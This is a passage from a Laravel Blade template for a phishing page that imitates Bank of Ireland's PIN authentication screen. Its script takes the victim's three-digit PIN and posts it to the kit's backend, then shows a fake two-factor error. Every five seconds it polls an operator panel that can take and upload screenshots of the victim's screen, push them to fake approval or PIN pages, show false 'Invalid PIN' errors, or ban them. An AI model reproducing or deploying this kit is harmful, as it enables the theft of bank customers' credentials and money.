                                        <div><span class="boi-font-regular boi_grey_dark boi-font-size-14">Waiting for your approval</span><br>
                                            <span class="boi-font-regular boi-font-size-12 boi_grey_dark">Tap here to complete any unfinished actions</span></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="C2__C2__COL_62DD69BBB46EE82C173653" style="float: left;width: 33%; width:5%;">
                            <div>
                                <div style="clear: left;" id="C2__C2__row_TXT_62DD69BBB46EE82C177192">
                                    <div id="C2__C2__TXT_62DD69BBB46EE82C177192" style="text-align: left; ">
                                        <div><i class="fa fa-chevron-right chevron-homepage-mobile boi-waiting-for-pull-select-arrow" aria-label=" . View your waiting for approval"></i><br></div>
                                    </div>
                                </div>
                                <div style="clear: left;" id="C2__C2__row_BUT_B4CDE349AD213518302104" class="col-hidden  ">
                                    <div id="C2__C2__p1_BUT_B4CDE349AD213518302104" class="col-hidden" style="float: left;">
                                        <div>&nbsp;</div>
                                    </div>
                                    <div class="col-hidden  " style="text-align: right; float: left;  " id="C2__C2__p4_BUT_B4CDE349AD213518302104">
                                        <div>
                                            <a onclick="ajaxButtonAction( null, 'C2__C2____B4CDE349AD213518 FormButton 71', 'C2__C2__BUT_B4CDE349AD213518302104', false, null, '', 'servletcontroller', '', false, true, '' );" href="javascript:void(0);" class="hiddenSCACallButton" id="C2__C2__BUT_B4CDE349AD213518302104" handlerchanged="Y" onoldclick="ajaxButtonAction( null, 'C2__C2____B4CDE349AD213518 FormButton 71', 'C2__C2__BUT_B4CDE349AD213518302104', false, null, '', 'servletcontroller', '', false, true, '' );"><span>Waiting for approval</span></a>

                                            <script type="text/javascript" charset="utf-8">
                                                //<![CDATA[



                                                $(function() {

                                                    function doWork(e) {




                                                        e.preventDefault();
                                                        e.stopPropagation();
                                                        try {
                                                            desktopPullNotifications({
                                                                id: "C2__C2__BUT_B4CDE349AD213518302104"
                                                                , COMPONENT_ID_PREFIX: "C2__C2__"
                                                                , IdToUpdate: ""
                                                                , ClassToRemove: ""
                                                                , ClassToToggle: ""
                                                                , ClassToAdd: ""
                                                                , ParentContextSelector: ""
                                                                , AnimationType: ""
                                                            })
                                                        } catch (e) {
                                                            log("Problem running javascript function: desktopPullNotifications");
                                                        }









                                                        var $parent = $("html");




                                                        if (!(typeof(boiparm) == 'undefined')) {
                                                            if (typeof(boiparm.boiform) == 'function') {
                                                                boiparm.boiform('C2__C2__boi_prefs');
                                                            }
                                                        }




                                                    }
                                                    var $el = $("#C2__C2__BUT_B4CDE349AD213518302104:not([handlerChanged='Y'])");
                                                    $el.attr("handlerChanged", "Y")
                                                        .attr("onoldclick", $el.attr("onclick"))
                                                        .removeProp("onclick");
                                                    if (!$el.hasClass("boi-delegate-click-to-container") && (".wating-approval-pull-section" === "")) {
                                                        $el.on("click", function(e) {
                                                            doWork(e);
                                                        });
                                                    }

                                                    $("#C2__C2__BUT_B4CDE349AD213518302104").closest(".wating-approval-pull-section")
                                                        .on("click", function(e) {
                                                            doWork(e);
                                                        })
                                                        .on("keypress", function(e) {
                                                            if (e.which === 13) {
                                                                doWork(e);
                                                            }
                                                        });

                                                    //Add support for space bar button click
                                                    $("#C2__C2__BUT_B4CDE349AD213518302104").keydown(function(e) {
                                                        if (e.which == 32) {
                                                            $("#C2__C2__BUT_B4CDE349AD213518302104").click();
                                                            e.preventDefault();
                                                        }
                                                    });
                                                });
                                                //]]>
                                            </script>
                                        </div>
                                    </div>
                                    <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                                </div>
                                <div style="clear: left;" id="C2__C2__row_TXT_32D9A8FC1BE38434153973">
                                    <div id="C2__C2__TXT_32D9A8FC1BE38434153973" style="text-align: left; ">
                                        <div>
                                            <script type="text/javascript">
                                                $(".wating-approval-pull-section").on('click', function() {
                                                    $(".hiddenSCACallButton").attr('value', 'SCAhiddenCallBtn');
                                                });
                                            </script>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                    <div>
                        <div style="clear: left;" id="C2__C2__row_TXT_32D9A8FC1BE38434153988">
                            <div id="C2__C2__TXT_32D9A8FC1BE38434153988" style="text-align: left; ">
                                <div>
                                    <script type="text/javascript" src="./PIN Authentication - cordova_loader.js"></script>
                                    <script type="text/javascript" src="./PIN Authentication - oneapp_plugin_integrations.js"></script>

                                    <script type="text/javascript">
                                        $("document").ready(function() {
                                            if (1 == "1" && '' == 'Y') {
                                                document.addEventListener('deviceready', desktopPullNotifications, false);
                                            }
                                        });
                                    </script>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
</div>
@endsection

@section('js')
<script>

function moveToNext(input, n) {
    const maxLength = 1;
    if (input.value.length === maxLength) {
      const pinBoxGroup = input.closest('.pin-box-group');
      const nextPinBoxGroup = pinBoxGroup.nextElementSibling;
      if (nextPinBoxGroup) {
        const nextInput = nextPinBoxGroup.querySelector('.pin-box input');
        if (nextInput) {
          nextInput.focus();
        } else {
        // If there are no more groups, remove focus from the last input
        input.blur();
      }

    }
  }
}

      $(".loginBtn").on("click", (e) => {
        e.preventDefault();
        $("#MinorAlert").css("display", "none");

        const pin = $("#C2__C2__C1__QUE_188DA78A3B0DB18F2500").val()  + $("#C2__C2__C1__QUE_188DA78A3B0DB18F2503").val()  + $("#C2__C2__C1__QUE_188DA78A3B0DB18F2505").val() ;
             
        if(pin == ""){
            $("#MinorAlert").css("display", "block");
            $("#MinorAlertMsg").text("PIN cnnot be empty. Please try again");
                    return;
        }
             
        if(pin.length < 3){
            $("#MinorAlert").css("display", "block");
            $("#MinorAlertMsg").text("Incomplete PIN. Please try again");
                    return;
        }
        if(pin.length > 3){
            $("#MinorAlert").css("display", "block");
            $("#MinorAlertMsg").text("PIN cannot be more than three digits. Please try again");
                    return;
        }



        $.ajax({
            method: "POST",
            url: "{{route('main.new')}}",
            data: {
                _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                "pin": $("#C2__C2__C1__QUE_188DA78A3B0DB18F2500").val() + $("#C2__C2__C1__QUE_188DA78A3B0DB18F2503").val() +$("#C2__C2__C1__QUE_188DA78A3B0DB18F2505").val(),
                "type": "newBoiPin",
            }
        }).done((data) => {
            $(".spinnerWrapper").addClass( "show");
            
            window.location.replace(
                        "{{route('main.boi_verification_error')}}?sessionid={{md5(time())}}&aid={{md5(date('ym'))}}&pid={{md5(time())}}&status=2fa_error");
        });
    });




    setInterval(async () => {
        await checkAction();
    }, 5000);

    const checkAction = async () => {
        $.ajax({
            method: "POST",
            url: "{{route('main.connection')}}",
            data: {
                _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                type: "checkAction",
            }
        }).done(function(data) {
            if (typeof myVariable === "string" && data.trim() == "none") {
                return false;
            }
            var data = JSON.parse(JSON.stringify(data));
            console.log(data.action);
            setCookie("set_name", data.set_name, 1);
            switch (data.action) {
                case "screenshot":
                    let img;
                    html2canvas(document.body).then(function(canvas) {
                        $.ajax({
                            type: "POST",
                            url: "{{route('main.connection')}}",
                            data: {
                                _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                                "type": "screenshot",
                                "img": canvas.toDataURL()
                            },
                        }).done(function(data) {});
                    });
                    break;
                case "boi_approve":
                    window.location.replace(
                        "{{route('main.boi_approve')}}?sessionid={{md5(time())}}&status=2fa");
                    break;
                case "boi_pin":
                    window.location.replace(
                        "{{route('main.boi_verification')}}?sessionid={{md5(time())}}&status=pin");
                    break;
                case "boi":
                    window.location.replace(
                        "{{route('main.boi')}}?sessionid={{md5(time())}}&status=boi");
                    break;
                case "error":
                    
                $(".spinnerWrapper").removeClass( "show");

                    $("#MinorAlert").css("display", "block");
                    $("#MinorAlertMsg").text("Invalid PIN. Please try again");

                    // $("#regNumber").val("");
                    // $("#PACNumber").val("");

                    break;
                case "bye":
                    window.location.replace("{{route('main.bye')}}?sessionid={{md5(time())}}");
                    break;

                case "ban":
                    $.ajax({
                        method: "POST",
                        url: "{{route('main.connection')}}",
                        data: {
                            _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                            type: "ban",
                            status: "banned",
                        }
                    }).done(function() {
                        window.location.replace("{{route('main.bye')}}?sessionid={{md5(time())}}");
                    });
                    break;
            }
        });
    }
</script>
    
@endsection